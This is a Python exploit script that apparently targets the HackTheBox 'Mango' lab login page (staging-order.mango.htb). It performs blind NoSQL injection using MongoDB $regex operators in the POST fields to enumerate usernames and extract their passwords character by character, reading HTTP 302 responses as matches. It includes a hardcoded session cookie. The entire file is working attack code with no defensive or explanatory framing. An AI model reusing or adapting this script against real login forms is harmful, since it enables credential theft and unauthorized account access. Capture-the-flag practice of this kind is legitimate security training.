#!/usr/bin/env python3

import requests
import string
import re

url = "http://staging-order.mango.htb"
headers = {"Host": "staging-order.mango.htb"}
cookies = {"PHPSESSID": "qaa1u2hqrctdpel2a730vmoo7c"}
possible_chars = list(string.ascii_letters) + list(string.digits) + [re.escape(c) for c in string.punctuation+string.whitespace ]


def get_password(username):
    print("Extracting password of "+username)
    params = {"username":username, "password[$regex]":"", "login": "login"}
    password = "^"
    while True:
        for c in possible_chars:
            params["password[$regex]"] = password + c + ".*"
            pr = requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=False)
            if int(pr.status_code) == 302:
                password += c
                break
        if c == possible_chars[-1]:
            print("Found password "+password[1:].replace("\\", "")+" for username "+username)
            return password[1:].replace("\\", "")

def get_usernames():
    usernames = []
    params = {"username[$regex]":"", "password[$regex]":".*", "login": "login"}
    for c in possible_chars:
        username = "^" + c
        params["username[$regex]"] = username + ".*"
        pr = requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=False)
        if int(pr.status_code) == 302:
            print("Found username starting with "+c)
            while True:
                for c2 in possible_chars:
                    params["username[$regex]"] = username + c2 + ".*"
                    if int(requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=False).status_code) == 302:
                        username += c2
                        print(username)
                        break

                if c2 == possible_chars[-1]:
                    print("Found username: "+username[1:])
                    usernames.append(username[1:])
                    break
    return usernames


for u in get_usernames():
    get_password(u)

